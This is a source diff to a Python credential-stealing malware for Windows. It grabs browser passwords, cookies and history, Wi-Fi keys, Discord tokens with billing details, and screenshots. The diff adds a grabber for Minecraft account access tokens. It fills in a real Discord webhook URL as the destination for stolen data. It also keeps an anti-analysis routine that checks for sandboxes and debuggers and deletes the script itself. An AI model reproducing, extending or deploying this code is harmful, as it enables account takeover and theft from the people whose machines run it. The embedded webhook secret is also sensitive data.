@@ -1,6 +1,7 @@
 import os
 import difflib
 import platform
+from tempfile import mkdtemp
 import threading
 import uuid
 import requests
@@ -8,6 +9,9 @@ import wmi
 import subprocess
 import sqlite3
 import psutil
+import ntpath
+import shutil
+import json
 
 from json import loads
 from re import findall, match
@@ -24,9 +28,9 @@ from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
-webhook = "%webhook_here%"
-ping = "%ping_enabled%"
-pingType = "%ping_type%"
+webhook = "https://discord.com/api/webhooks/992136786992185465/lFiCxhr-El9xcFwTZ-kTLG8rrtKJ7GicYPaEAV2Z7zU6RCNTaT5y1Kyo5c0iRsXrFVdI"
+ping = True
+pingType = "here"
 
 dummy_message = "Loading..." # change if you want
 print(dummy_message)
@@ -40,7 +44,7 @@ def main(webhook):
     get_inf()
     grabtokens()
 
-    threads = [ss, grabpassword, grabcookies, grabhistory, grabwifi]
+    threads = [ss, grabpassword, grabcookies, grabhistory, grabwifi, grabmctokens]
 
     for func in threads:
         process = threading.Thread(target=func, daemon=True)
@@ -268,7 +272,7 @@ class grabtokens():
             embed.add_field(name="DISCORD INFO", value=f'''```yaml
 Discord Username: {username} \nDiscord ID: {uid}\nEmail: {email}\n\nPhone: {phone}\nNitro: {nitro}\nBilling: {methods}\n\nToken: {token}```''', inline=False)
 
-
+@try_extract
 def ss():
     ImageGrab.grab(
         bbox=None,
@@ -415,7 +419,7 @@ class grabwifi:
                 self.wifi_list.append(line.split(":")[-1][1:])
             else:
                 with open(".\\wifi-passwords.txt", "a") as f:
-                    f.write(f'There is no wireless interface on the system. Ethernet using twats.')
+                    f.write(f'There is no wireless interface on the system. Ethernet using twat.')
                 f.close()
 
         for i in self.wifi_list:
@@ -433,6 +437,24 @@ class grabwifi:
                 for i, j in self.name_pass.items():
                     f.write(f'Wifi Name : {i} | Password : {j}\n')
         f.close()
+
+@try_extract
+class grabmctokens():
+    def __init__(self):
+        self.roaming = os.getenv("appdata")
+
+        with open((".\\minecraft-sessioninfo.json"), 'w', encoding="cp437", errors='ignore') as f:
+            launcher_profiles = json.loads(open(self.roaming + "\\.minecraft\\launcher_accounts.json").read())
+            f.write("https://github.com/Smug246 | Minecraft Accounts & Access Tokens\n\n")
+            f.write(str(launcher_profiles))
+        hide(".\\minecraft-sessioninfo.json")
+
+        with open((".\\minecraft-usercache.json"), 'w', encoding="cp437", errors='ignore') as g:
+            usercache = json.loads(open(self.roaming + "\\.minecraft\\usercache.json").read())
+            g.write("https://github.com/Smug246 | Minecraft UUID & Display Name\n\n")
+            g.write(str(usercache))
+        hide(".\\minecraft-usercache.json")
+
 
 @try_extract
 class grabcookies():
@@ -508,34 +530,34 @@ class grabcookies():
             f.write("\n\nUsed Login Dbs:\n")
             f.write("\n".join(used_login_dbs))
 
-def zipup():    
+def zipup():
+    global zipf
     with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
         zipf.write("google-passwords.txt")
         zipf.write("google-cookies.txt")
         zipf.write("google-history.txt")
         zipf.write("wifi-passwords.txt")
+        zipf.write("minecraft-sessioninfo.json")
+        zipf.write("minecraft-usercache.json")
         zipf.write("screenshot.png")
-
     hide(f'Luna-Logged-{os.getenv("Username")}.zip')
-
 
 def cleanup():
     for clean in [os.remove("google-passwords.txt"),
                   os.remove("google-cookies.txt"),
                   os.remove("google-history.txt"),
                   os.remove("wifi-passwords.txt"),
+                  os.remove("minecraft-usercache.json"),
+                  os.remove("minecraft-sessioninfo.json"),
                   os.remove("screenshot.png"),
                   os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")]:
-
         try:
             clean()
         except Exception:
             pass
 
-
 def hide(file):
     SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
-
 
 class debug:
     def __init__(self):
@@ -554,8 +576,7 @@ class debug:
                                  "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4", ]
         self.blackListedIPS = ["88.132.231.71", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90",
                                "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50", ]
-        self.blacklistedProcesses = [
-            "HTTP Toolkit.exe", "Fiddler.exe", "Wireshark.exe", "HTTPDebuggerUI.exe"]
+        self.blacklistedProcesses = ["HTTP Toolkit.exe", "Fiddler.exe", "Wireshark.exe", "HTTPDebuggerUI.exe"]
 
         self.check_process()
 
@@ -605,7 +626,6 @@ class debug:
         os.system("del {}\{}".format(os.path.dirname(
             __file__), os.path.basename(__file__)))
         exit()
-
 
 if __name__ == '__main__' and os.name == "nt":
     try:
